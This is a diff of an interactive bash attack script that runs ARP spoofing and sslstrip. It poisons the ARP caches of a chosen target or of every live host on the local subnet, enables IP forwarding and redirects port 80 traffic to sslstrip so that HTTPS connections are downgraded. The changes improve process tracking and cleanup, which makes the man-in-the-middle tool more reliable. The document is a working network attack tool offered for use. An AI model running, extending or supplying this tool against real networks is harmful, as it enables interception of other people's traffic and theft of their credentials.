@@ -26,6 +26,12 @@ if [[ $EUID -ne 0 ]]; then
     exit 1
 fi
 
+# Flush old iptables rules before starting
+echo -e "${YELLOW}Flushing old iptables rules...${NC}"
+iptables -t nat -F
+iptables -F
+iptables -X
+
 # Enable IP forwarding
 echo -e "${YELLOW}Enabling IP forwarding...${NC}"
 sysctl -w net.ipv4.ip_forward=1 &>/dev/null
@@ -34,11 +40,20 @@ sysctl -w net.ipv4.ip_forward=1 &>/dev/null
 function cleanup() {
     echo -e "${RED}\nRestoring system configuration...${NC}"
     sysctl -w net.ipv4.ip_forward=0 &>/dev/null
-    pkill arpspoof &>/dev/null
-    pkill sslstrip &>/dev/null
+    
+    echo -e "${YELLOW}Flushing iptables rules...${NC}"
     iptables -t nat -F
     iptables -F
     iptables -X
+
+    if [[ -n "$sslstrip_pid" ]]; then
+        kill $sslstrip_pid 2>/dev/null
+        wait $sslstrip_pid 2>/dev/null
+    fi
+    if [[ -n "$arpspoof_pids" ]]; then
+        kill $arpspoof_pids 2>/dev/null
+    fi
+
     echo -e "${GREEN}Cleanup complete.${NC}"
     exit 0
 }
@@ -58,7 +73,7 @@ function select_interface() {
     while true; do
         echo -e "\n${MAGENTA}========================================${NC}"
         echo -e "${CYAN}Available network interfaces:${NC}"
-        interfaces=$(ip -o link show | awk -F': ' '{print $2}')
+        interfaces=$(ifconfig -a | grep -oP '^\w+')
         i=1
         declare -gA iface_map
         while IFS= read -r line; do
@@ -67,14 +82,13 @@ function select_interface() {
             i=$((i + 1))
         done <<< "$interfaces"
 
-        # Ask the user for the interface selection
         echo -e "\n${YELLOW}Enter the number of the network interface you want to use: ${NC}"
         read -p "$(echo -e "${YELLOW}Your choice: ${NC}")" iface_number
 
         if [[ -n "${iface_map["$iface_number"]}" ]]; then
             selected_iface="${iface_map["$iface_number"]}"
             echo -e "${GREEN}Selected interface: $selected_iface${NC}"
-            return  # Exit the function when a valid interface is selected
+            return
         else
             echo -e "${RED}Invalid selection. Please try again.${NC}"
         fi
@@ -95,7 +109,7 @@ function enable_sslstrip() {
         case $sslstrip_choice in
             yes|y)
                 echo -e "${YELLOW}Starting SSLStrip...${NC}"
-                sslstrip -l 8080 &
+                sslstrip -l 8080 & sslstrip_pid=$!
                 iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
                 echo -e "${GREEN}SSLStrip enabled.${NC}"
                 break
@@ -123,11 +137,11 @@ function attack_single_continuous() {
         echo -e "${GREEN}Starting ARP spoofing on $target_ip...${NC}"
         
         # Attack the device continuously
-                echo -e "${GREEN}Attacking now... $target_ip Press CTRL+C to stop.${NC}"
+        echo -e "${GREEN}Attacking now... $target_ip Press CTRL+C to stop.${NC}"
         while true; do
-            arpspoof -i $selected_iface -t $target_ip $router &>/dev/null &
-            arpspoof -i $selected_iface -t $router $target_ip &>/dev/null &
-            sleep 3  # Shorter sleep to maintain constant pressure on the target
+        arpspoof -i $selected_iface -t $target_ip $router &> /dev/null & arpspoof_pids+=" $!"
+        arpspoof -i $selected_iface -t $router $target_ip &> /dev/null & arpspoof_pids+=" $!"
+        sleep 3  # Shorter sleep to maintain constant pressure on the target
         done
     done
 }
@@ -145,13 +159,12 @@ function attack_all_continuous() {
             target_ip="${i1}.${i2}.${i3}.${ip}"
             if ping -c 1 -W 1 $target_ip &>/dev/null && [[ -z "${attacked_devices[$target_ip]}" ]]; then
                 attacked_devices[$target_ip]=1
-                echo -e "${GREEN}New device found: $target_ip Attacking now... Press CTRL+C to stop.${NC}"  # Print message for new device
-                # Launch ARP spoofing in the background
-                arpspoof -i $selected_iface -t $target_ip $router &>/dev/null &
-                arpspoof -i $selected_iface -t $router $target_ip &>/dev/null &
+                echo -e "${GREEN}New device found: $target_ip Attacking now... Press CTRL+C to stop.${NC}"
+                arpspoof -i $selected_iface -t $target_ip $router &> /dev/null & arpspoof_pids+=" $!"
+                arpspoof -i $selected_iface -t $router $target_ip &> /dev/null & arpspoof_pids+=" $!"
             fi
         done
-        sleep 15  # Sleep before rescanning the network
+        sleep 15
     done
 }
 
